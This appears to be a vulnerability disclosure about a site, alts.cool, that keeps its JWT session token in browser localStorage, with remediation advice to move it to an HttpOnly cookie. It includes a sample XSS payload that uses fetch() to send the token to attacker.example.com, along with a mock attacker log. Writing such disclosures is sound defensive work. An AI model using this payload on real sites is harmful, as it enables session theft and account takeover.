Summary

alts.cool persists the user session token under the key alts_session_id in browser localStorage rather than in an HttpOnly cookie. The stored value is a signed JWT Bearer token. Because localStorage is fully accessible to any JavaScript executing in the page origin, the token can be exfiltrated by a reflected or stored XSS payload, a malicious third-party script, a browser extension, or any other script running on alts.cool. Once extracted, the token authenticates against GET /api/auth/me and grants full access to the victim's account, including the admin panel at /login.

Impact: An attacker who can execute JavaScript in the context of alts.cool (via any XSS vector, supply-chain compromise of a third-party script, or a browser extension) gains a persistent Bearer token that silently authenticates as the victim. The admin panel at /login has no CAPTCHA, so a stolen admin session provides immediate privileged access.

Vulnerability Detail

Step 1 — Token Stored in localStorage

After a successful login the application writes the JWT to localStorage instead of setting a cookie:

Proof — JavaScript Console / Attacker Payload

const stolenToken = localStorage.getItem('alts_session_id');
console.log(stolenToken);

Step 3 — Simulated XSS Exfiltration Payload

A one-liner payload that exfiltrates the token to an attacker-controlled server:

Proof — Exfiltration Payload
// Injected via any XSS vector on alts.cool:
fetch('https://attacker.example.com/collect?t=' +
  encodeURIComponent(localStorage.getItem('alts_session_id')));

// Attacker server log:
// GET /collect?t=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... HTTP/1.1

Admin Panel — No CAPTCHA

The admin login is served at https://alts.cool/login (not a separate subdomain or /admin/login path). There is no CAPTCHA or secondary challenge on this form. A stolen session token bypasses the login page entirely via direct API calls; an attacker does not even need to interact with the UI.

Root Cause

The frontend JavaScript stores the token with localStorage.setItem('alts_session_id', jwt) on login. localStorage has no equivalent to cookie security flags — it is always readable by any same-origin JavaScript and is never automatically scoped to HTTPS-only or restricted from script access.

CWE Reference

CWE-922: Insecure Storage of Sensitive Information
The product stores sensitive information without properly restricting read or write access by actors that are outside the intended control sphere. Here, the session token (a credential equivalent) is stored in a browser API fully exposed to any same-origin script.

Remediation

Primary Fix — Move Session to HttpOnly Cookie

Issue the session cookie server-side on the login response:

Set-Cookie: alts_session_id=<jwt>;
  HttpOnly;
  Secure;
  SameSite=Strict;
  Path=/;
  Max-Age=604800

Remove all localStorage.setItem('alts_session_id', ...) calls from the frontend.
